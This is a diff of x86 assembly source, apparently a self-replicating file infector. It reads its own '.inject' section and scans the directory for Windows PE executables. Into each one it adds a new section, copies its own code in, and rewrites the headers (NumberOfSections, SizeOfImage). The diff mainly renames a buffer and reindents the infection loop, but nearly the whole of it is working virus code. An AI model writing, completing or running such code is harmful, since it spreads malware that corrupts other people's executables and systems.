@@ -42,7 +42,6 @@ inject SEGMENT read write execute
     ; .data?
     tempDword dd 0
     tempDword2 dd 0
-    filePath db 260 DUP(0) ; filePath[MAX_PATH]
     temp320B db 320 DUP(0) ; To store WIN32_FIND_DATAA
     
     entrySectionOffset EQU $ - data_start
@@ -139,12 +138,12 @@ start:
     ; Get name of current process
     invoke fromStack(argv0),
     		0, 							; Current process
-    		daccess(offset filePath), 	; To store output
+    		daccess(offset temp320B), 	; To store output
     		260							; MAX_PATH
     
     ; Open current file for READing
     invoke fromStack(fopen),
-    		daccess(offset filePath),
+    		daccess(offset temp320B),
     		40000000h, 		; GENERIC_READ
 	    	0, 				; No sharing
 	    	0,
@@ -164,30 +163,29 @@ start:
 	add eax, 20
 	getval fromStack(selfHand), 2, SEEK_SET, eax
 	add ebx, vaccess(tempDword) ; ebx = SectionTable #1
-	mov daccess(filePath), 0
+	mov daccess(temp320B), 0
 	invoke fromStack(fseek), fromStack(selfHand), ebx, 0, SEEK_SET
 	section_header_loop:
 		invoke fromStack(fread),
 				fromStack(selfHand),
-				daccess(filePath),
+				daccess(temp320B),
 				40,
 				daccess(tempDword2),
 				0
-		mov esi, daccess(filePath)
+		mov esi, daccess(temp320B)
 		mov edi, daccess(ishName)
 		mov ecx, 8
 		cld
 		repe cmpsb
-	jz section_header_found
+		jz section_header_found
 		
 		dec edx
 		cmp edx, 0
 	ja section_header_loop
 	
 	section_header_found:
-	toStack selfVirtualSize, vaccess(offset filePath + 8)
-	toStack selfPointerToRawData, vaccess(offset filePath + 20)
-	
+	toStack selfVirtualSize, vaccess(offset temp320B + 8)
+	toStack selfPointerToRawData, vaccess(offset temp320B + 20)
     
     ; Find first file in directory
     push daccess(offset temp320B)
@@ -196,148 +194,148 @@ start:
     toStack fileHand
     
     openFile:
-    push 0
-    push 80h ; FILE_ATTRIBUTE_NORMAL
-    push 4 ; OPEN_ALWAYS
-    push 0
-	push 0 ; No sharing
-	push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
-	push daccess(offset temp320B) + 2Ch ; cFileName in WIN32_FIND_DATAA
-	call fromStack(fopen)
-	toStack tgHand
-	
-	; Obtain and verify magic bytes "MZ"
-	getval fromStack(tgHand), 2
-    cmp tempDword, 5a4dh
-    jne nextFile ; Not a PE file
-    
-    ; e_lfanew
-    getval fromStack(tgHand), 4, SEEK_SET, 3Ch
-	toStack lfanew, vaccess(tempDword)
-    
-    mov ecx, fromStack(lfanew)
-    add ecx, 6
-    getval fromStack(tgHand), 2, SEEK_SET, ecx
-    toStack NumberOfSections, vaccess(tempDword)
-    inc vaccess(tempDword)
-    setval fromStack(tgHand), 2, SEEK_SET, ecx ; Insert new NumberOfSections
-    
-    add ecx, 20 - 6 ; = lfanew + 20
-    getval fromStack(tgHand), 2, SEEK_SET, ecx
-    toStack SizeOfOptionalHeader, vaccess(tempDword)
-    
-    add ecx, 4 ; = lfanew + 24 = ioh_offset
-    toStack ioh_offset, ecx
-    getval fromStack(tgHand), 2, SEEK_SET, ecx
-    toStack Magic, vaccess(tempDword)
-    
-    mov ecx, fromStack(ioh_offset)
-    add ecx, 16
-    getval fromStack(tgHand), 4, SEEK_SET, ecx
-    toStack AddressOfEntryPoint, vaccess(tempDword)
-    
-    mov ecx, fromStack(ioh_offset)
-    add ecx, 32
-    getval fromStack(tgHand), 4, SEEK_SET, ecx
-    toStack SectionAlignment, vaccess(tempDword)
-    
-    getval fromStack(tgHand), 4
-    toStack FileAlignment, vaccess(tempDword)
-    
-    ; DWORD lastish_offset = ioh_offset + SizeOfOptionalHeader + 40 * (NumberOfSections - 1);
-    mov ecx, fromStack(ioh_offset)
-    add fromStack(SizeOfOptionalHeader)
-    mov edx, fromStack(NumberOfSections)
-    dec edx
-    imul edx, 40 ; Size of 1 section header
-    add ecx, edx
-    toStack lastish_offset, ecx
-    
-    ; Obtain lastish.VirtualAddress
-    add ecx, 12
-    getval fromStack(tgHand), 4, SEEK_SET, ecx
-	mov edx, vaccess(tempDword)
-    
-    ; Obtain lastish.SizeOfRawData
-    getval fromStack(tgHand), 4
-	add edx, vaccess(tempDword)
-	
-	closest edx, fromStack(SectionAlignment)
-	mov daccess(ishVirtualAddress), eax
-    
-    mov ecx, fromStack(lastish_offset)
-    add ecx, 40
-    toStack newish_offset, ecx
-    
-    invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_END
-    
-    ; Pad end of file to match FileAlignment
-    mov ebx, eax
-    inc eax
-    closest	eax, fromStack(FileAlignment)
-    mov ecx, eax
-    sub ecx, ebx
-    mov daccess(tempDword), 0
-    pad1_loop:
-		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
-		dec ecx
-		cmp ecx, 0
-    ja pad1_loop
-    invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR
-	mov daccess(ishPointerToRawData), eax
-    
-    ; Copy .inject
-    mov ecx, fromStack(selfVirtualSize)
-    invoke fromStack(fseek), fromStack(selfHand), fromStack(selfPointerToRawData), 0, SEEK_SET
-    copy_start:
-		cmp ecx, 320
-		jbe copy_end
-		invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), 320, daccess(tempDword2), 0
-		invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), 320, daccess(tempDword2), 0
-		sub ecx, 320
-    jmp copy_start
-    copy_end:
-	    invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), ecx, daccess(tempDword2), 0
-		invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), ecx, daccess(tempDword2), 0
-		
-	; Register VirtualSize & SizeOfRawData
-	invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR
-	mov ebx, eax
-	sub ebx, vaccess(ishPointerToRawData)
-	mov daccess(ishVirtualSize), ebx	
-	closest	eax, fromStack(FileAlignment)
-	mov daccess(ishSizeOfRawData), eax
-	
-	; Pad section
-	mov ecx, eax
-	sub ecx, vaccess(ishVirtualSize)
-    mov daccess(tempDword), 0
-	pad2_loop:
-		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
-		dec ecx
-		cmp ecx, 0
-    ja pad2_loop
-	
-	; Write new Section Header
-	invoke fromStack(fseek), fromStack(tgHand), fromStack(newish_offset), 0, SEEK_SET
-	invoke fromStack(fwrite), fromStack(tgHand), daccess(ishName), 40, daccess(tempDword2), 0
-	
-	; Edit SizeOfImage
-	mov ebx, fromStack(ioh_offset)
-	add ebx, 56
-	getval fromStack(tgHand), 4, SEEK_SET, ebx
-	mov eax, vaccess(tempDword)
-	add eax, vaccess(ishSizeOfRawData)
-	closest eax, fromStack(SectionAlignment)
-	mov daccess(tempDword), eax
-	invoke fromStack(fseek), fromStack(tgHand), ebx, 0, SEEK_SET
-	invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 4, daccess(tempDword2), 0
-	
-    nextFile:
-    invoke fromStack(fclose), fromStack(tgHand)
-    
-    invoke fromStack(ffind2), fromStack(fileHand), daccess(offset temp320B)
-    cmp eax, 0
+		push 0
+		push 80h ; FILE_ATTRIBUTE_NORMAL
+		push 4 ; OPEN_ALWAYS
+		push 0
+		push 0 ; No sharing
+		push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
+		push daccess(offset temp320B) + 2Ch ; cFileName in WIN32_FIND_DATAA
+		call fromStack(fopen)
+		toStack tgHand
+
+		; Obtain and verify magic bytes "MZ"
+		getval fromStack(tgHand), 2
+		cmp tempDword, 5a4dh
+		jne nextFile ; Not a PE file
+
+		; e_lfanew
+		getval fromStack(tgHand), 4, SEEK_SET, 3Ch
+		toStack lfanew, vaccess(tempDword)
+
+		mov ecx, fromStack(lfanew)
+		add ecx, 6
+		getval fromStack(tgHand), 2, SEEK_SET, ecx
+		toStack NumberOfSections, vaccess(tempDword)
+		inc vaccess(tempDword)
+		setval fromStack(tgHand), 2, SEEK_SET, ecx ; Insert new NumberOfSections
+
+		add ecx, 20 - 6 ; = lfanew + 20
+		getval fromStack(tgHand), 2, SEEK_SET, ecx
+		toStack SizeOfOptionalHeader, vaccess(tempDword)
+
+		add ecx, 4 ; = lfanew + 24 = ioh_offset
+		toStack ioh_offset, ecx
+		getval fromStack(tgHand), 2, SEEK_SET, ecx
+		toStack Magic, vaccess(tempDword)
+
+		mov ecx, fromStack(ioh_offset)
+		add ecx, 16
+		getval fromStack(tgHand), 4, SEEK_SET, ecx
+		toStack AddressOfEntryPoint, vaccess(tempDword)
+
+		mov ecx, fromStack(ioh_offset)
+		add ecx, 32
+		getval fromStack(tgHand), 4, SEEK_SET, ecx
+		toStack SectionAlignment, vaccess(tempDword)
+
+		getval fromStack(tgHand), 4
+		toStack FileAlignment, vaccess(tempDword)
+
+		; DWORD lastish_offset = ioh_offset + SizeOfOptionalHeader + 40 * (NumberOfSections - 1);
+		mov ecx, fromStack(ioh_offset)
+		add fromStack(SizeOfOptionalHeader)
+		mov edx, fromStack(NumberOfSections)
+		dec edx
+		imul edx, 40 ; Size of 1 section header
+		add ecx, edx
+		toStack lastish_offset, ecx
+
+		; Obtain lastish.VirtualAddress
+		add ecx, 12
+		getval fromStack(tgHand), 4, SEEK_SET, ecx
+		mov edx, vaccess(tempDword)
+
+		; Obtain lastish.SizeOfRawData
+		getval fromStack(tgHand), 4
+		add edx, vaccess(tempDword)
+
+		closest edx, fromStack(SectionAlignment)
+		mov daccess(ishVirtualAddress), eax
+
+		mov ecx, fromStack(lastish_offset)
+		add ecx, 40
+		toStack newish_offset, ecx
+
+		invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_END
+
+		; Pad end of file to match FileAlignment
+		mov ebx, eax
+		inc eax
+		closest	eax, fromStack(FileAlignment)
+		mov ecx, eax
+		sub ecx, ebx
+		mov daccess(tempDword), 0
+		pad1_loop:
+			invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
+			dec ecx
+			cmp ecx, 0
+		ja pad1_loop
+		invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR
+		mov daccess(ishPointerToRawData), eax
+
+		; Copy .inject
+		mov ecx, fromStack(selfVirtualSize)
+		invoke fromStack(fseek), fromStack(selfHand), fromStack(selfPointerToRawData), 0, SEEK_SET
+		copy_start:
+			cmp ecx, 320
+			jbe copy_end
+			invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), 320, daccess(tempDword2), 0
+			invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), 320, daccess(tempDword2), 0
+			sub ecx, 320
+		jmp copy_start
+		copy_end:
+			invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), ecx, daccess(tempDword2), 0
+			invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), ecx, daccess(tempDword2), 0
+			
+		; Register VirtualSize & SizeOfRawData
+		invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR
+		mov ebx, eax
+		sub ebx, vaccess(ishPointerToRawData)
+		mov daccess(ishVirtualSize), ebx	
+		closest	eax, fromStack(FileAlignment)
+		mov daccess(ishSizeOfRawData), eax
+
+		; Pad section
+		mov ecx, eax
+		sub ecx, vaccess(ishVirtualSize)
+		mov daccess(tempDword), 0
+		pad2_loop:
+			invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
+			dec ecx
+			cmp ecx, 0
+		ja pad2_loop
+
+		; Write new Section Header
+		invoke fromStack(fseek), fromStack(tgHand), fromStack(newish_offset), 0, SEEK_SET
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(ishName), 40, daccess(tempDword2), 0
+
+		; Edit SizeOfImage
+		mov ebx, fromStack(ioh_offset)
+		add ebx, 56
+		getval fromStack(tgHand), 4, SEEK_SET, ebx
+		mov eax, vaccess(tempDword)
+		add eax, vaccess(ishSizeOfRawData)
+		closest eax, fromStack(SectionAlignment)
+		mov daccess(tempDword), eax
+		invoke fromStack(fseek), fromStack(tgHand), ebx, 0, SEEK_SET
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 4, daccess(tempDword2), 0
+
+	nextFile:
+		invoke fromStack(fclose), fromStack(tgHand)
+
+		invoke fromStack(ffind2), fromStack(fileHand), daccess(offset temp320B)
+		cmp eax, 0
     jne openFile
     
     ; No more file to write
